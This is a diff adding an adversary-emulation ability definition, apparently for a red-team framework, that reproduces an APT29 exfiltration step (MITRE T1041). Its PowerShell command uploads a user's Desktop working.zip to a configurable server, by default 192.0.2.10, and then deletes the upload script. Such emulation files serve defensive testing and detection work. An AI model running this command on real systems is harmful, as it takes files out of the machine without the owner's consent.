@@ -1,0 +1,39 @@
+- id: 2d18c8ec-4593-49dc-9bf4-11d0673d6ae6
+  name: Data from staged file (T1074) and Exfiltration over C2 Channel (T1041)
+  description: Copy a target file from a remote file share through the existing C2 channel
+  tactic: exfiltration
+  technique:
+    attack_id: T1041
+    name: "Exfiltration Over C2 Channel"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_exfiltration
+  procedure_step: "9.B.8"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Import-Module .\upload.ps1 -Verbose -Force;
+          Invoke-MultipartFormDataUpload -InFile "C:\Users\#{profile_user}\Desktop\working.zip" -Uri "#{server}/file/upload";
+        cleanup: |
+          remove-item upload.ps1 -Force
+        payloads:
+        - upload.ps1
+
+  input_arguments:
+    profile_user:
+      description: Name of profile user
+      type: string
+      default: Administrator
+
+    server:
+      description: IP or Hostname of server
+      type: string
+      default: 192.0.2.10
+
+  executors:
+  - name: powershell
+    command: |
+      Import-Module .\upload.ps1 -Verbose -Force;
+      Invoke-MultipartFormDataUpload -InFile "C:\Users\#{profile_user}\Desktop\working.zip" -Uri "#{server}/file/upload";
+    cleanup_command: |
+      remove-item upload.ps1 -Force
